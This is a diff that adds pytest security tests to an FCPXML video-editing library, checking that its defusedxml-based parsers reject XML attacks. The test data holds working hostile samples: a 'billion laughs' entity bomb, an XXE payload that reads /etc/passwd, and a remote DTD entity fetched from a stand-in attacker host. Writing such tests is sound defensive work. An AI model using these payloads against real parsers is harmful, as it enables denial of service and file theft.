@@ -2,6 +2,7 @@
 Security tests — input validation, sanitization, and hardening.
 
 Covers:
+- XXE (XML External Entity) and entity expansion protection
 - MarkerType.from_string injection/abuse resistance
 - XML value sanitization (null bytes, control chars, length limits)
 - Parser file size limits
@@ -9,9 +10,11 @@ Covers:
 """
 
 import pytest
+from defusedxml import DTDForbidden, EntitiesForbidden
 
 from fcpxml.models import MarkerType
 from fcpxml.parser import _MAX_FILE_SIZE_BYTES, FCPXMLParser
+from fcpxml.safe_xml import safe_fromstring, safe_parse
 from fcpxml.writer import (
     _MAX_MARKER_NAME_LENGTH,
     FCPXMLModifier,
@@ -317,3 +320,117 @@ class TestFileSizeLimit:
         parser = FCPXMLParser()
         project = parser.parse_file(str(normal))
         assert project.name == "Test"
+
+
+# ============================================================================
+# XXE and entity expansion protection (defusedxml)
+# ============================================================================
+
+class TestXXEProtection:
+    """Verify that defusedxml blocks XML attacks at all entry points."""
+
+    BILLION_LAUGHS = """\
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<fcpxml version="1.11">&lol4;</fcpxml>"""
+
+    XXE_FILE_READ = """\
+<?xml version="1.0"?>
+<!DOCTYPE fcpxml [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<fcpxml version="1.11">
+    <resources>
+        <asset id="r1" name="&xxe;" src="test.mov"/>
+    </resources>
+</fcpxml>"""
+
+    EXTERNAL_DTD_WITH_ENTITY = """\
+<?xml version="1.0"?>
+<!DOCTYPE fcpxml [
+  <!ENTITY % remote SYSTEM "http://evil.example.com/payload.dtd">
+  %remote;
+]>
+<fcpxml version="1.11"/>"""
+
+    def test_billion_laughs_blocked_fromstring(self):
+        """Entity expansion bomb must be rejected by safe_fromstring."""
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            safe_fromstring(self.BILLION_LAUGHS)
+
+    def test_xxe_file_read_blocked_fromstring(self):
+        """External entity file read must be rejected by safe_fromstring."""
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            safe_fromstring(self.XXE_FILE_READ)
+
+    def test_external_dtd_entity_blocked_fromstring(self):
+        """Remote DTD parameter entity must be rejected by safe_fromstring."""
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            safe_fromstring(self.EXTERNAL_DTD_WITH_ENTITY)
+
+    def test_billion_laughs_blocked_parse(self, tmp_path):
+        """Entity expansion bomb must be rejected by safe_parse."""
+        p = tmp_path / "bomb.fcpxml"
+        p.write_text(self.BILLION_LAUGHS)
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            safe_parse(str(p))
+
+    def test_xxe_file_read_blocked_parse(self, tmp_path):
+        """External entity file read must be rejected by safe_parse."""
+        p = tmp_path / "xxe.fcpxml"
+        p.write_text(self.XXE_FILE_READ)
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            safe_parse(str(p))
+
+    def test_external_dtd_entity_blocked_parse(self, tmp_path):
+        """Remote DTD parameter entity must be rejected by safe_parse."""
+        p = tmp_path / "dtd.fcpxml"
+        p.write_text(self.EXTERNAL_DTD_WITH_ENTITY)
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            safe_parse(str(p))
+
+    def test_parser_rejects_billion_laughs(self):
+        """FCPXMLParser.parse_string must reject entity expansion attacks."""
+        parser = FCPXMLParser()
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            parser.parse_string(self.BILLION_LAUGHS)
+
+    def test_parser_rejects_xxe(self):
+        """FCPXMLParser.parse_string must reject XXE attacks."""
+        parser = FCPXMLParser()
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            parser.parse_string(self.XXE_FILE_READ)
+
+    def test_parser_file_rejects_billion_laughs(self, tmp_path):
+        """FCPXMLParser.parse_file must reject entity expansion from files."""
+        p = tmp_path / "bomb.fcpxml"
+        p.write_text(self.BILLION_LAUGHS)
+        parser = FCPXMLParser()
+        with pytest.raises((EntitiesForbidden, DTDForbidden)):
+            parser.parse_file(str(p))
+
+    def test_clean_xml_still_parses(self):
+        """Legitimate FCPXML without DTD/entities must still parse fine."""
+        xml = """<?xml version="1.0" encoding="UTF-8"?>
+<fcpxml version="1.11">
+    <resources>
+        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
+    </resources>
+    <library>
+        <event name="Test">
+            <project name="Safe">
+                <sequence format="r1" duration="0s">
+                    <spine/>
+                </sequence>
+            </project>
+        </event>
+    </library>
+</fcpxml>"""
+        parser = FCPXMLParser()
+        project = parser.parse_string(xml)
+        assert project.name == "Safe"
